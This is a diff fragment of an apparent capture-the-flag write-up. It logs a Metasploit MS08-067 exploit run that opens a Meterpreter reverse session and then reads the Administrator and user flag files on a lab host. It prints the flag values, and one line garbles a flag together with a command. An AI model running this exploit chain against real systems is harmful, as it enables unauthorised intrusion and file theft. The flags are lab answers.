@@ -107,5 +107,32 @@ msf6 exploit(windows/smb/ms08_067_netapi) > run
 [*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
 [*] Sending stage (175174 bytes) to 10.10.10.4
 [*] Meterpreter session 1 opened (10.10.14.11:4444 -> 10.10.10.4:1047) at 2021-02-09 20:27:43 +0900
+
+meterpreter > cd /
+meterpreter > dir
+[-] Error running command dir: NoMethodError undefined method `[]' for nil:NilClass
+meterpreter > type
+[-] Unknown command: type.
+meterpreter > pwd
+C:\
+meterpreter > ls
+[-] Error running command ls: NoMethodError undefined method `[]' for nil:NilClass
+meterpreter > search -f root.txt
+Found 1 result...
+    c:\Documents and Settings\Administrator\Desktop\root.txt (32 bytes)
+meterpreter > type "c:\Documents and Settings\Administrator\Desktop\root.txt"
+[-] Unknown command: type.
+meterpreter > cat "c:\Documents and Settings\Administrator\Desktop\root.txt"
+993442d258b0e0ec917cae9e695d5713
+
+
+meterpreter > cat "c:\Documents and Settings\Administrator\Desktop\root.txt"
+993442d258b0e0search -f user.txt
+Found 1 result...
+    c:\Documents and Settings\john\Desktop\user.txt (32 bytes)
+meterpreter > cat "c:\Documents and Settings\john\Desktop\user.txt"
+e69af0e4f443de7e36876fda4ec7644f
+meterpreter > 
+
 ```
 
